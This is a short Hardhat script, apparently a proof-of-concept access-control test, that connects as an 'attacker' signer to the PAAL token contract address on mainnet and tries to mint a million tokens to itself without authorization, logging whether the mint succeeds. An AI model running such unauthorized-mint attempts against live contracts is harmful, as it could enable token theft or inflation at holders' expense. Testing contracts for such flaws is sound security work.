const { ethers } = require("hardhat");

async function main() {
  // PAAL token address (mainnet)
  const paalAddress = "0xEf0B251E8E83A1F3a6397737a2078975f7B52F94";

  // Interface with mint functionality for testing
  const IERC20Mintable = [
    "function mint(address to, uint256 amount) external",
    "function balanceOf(address account) external view returns (uint256)"
  ];

  const [attacker] = await ethers.getSigners();

  // Attach interface
  const paal = new ethers.Contract(paalAddress, IERC20Mintable, attacker);

  console.log("[*] Attempting unauthorized mint...");
  const mintAmount = ethers.utils.parseUnits("1000000", 18);

  try {
    const tx = await paal.mint(attacker.address, mintAmount);
    await tx.wait();

    const newBalance = await paal.balanceOf(attacker.address);
    console.log(`[+] Mint successful! Attacker balance: ${newBalance.toString()}`);
  } catch (err) {
    console.error("[!] Mint failed. Contract likely has proper access control.");
    console.error(err.message);
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});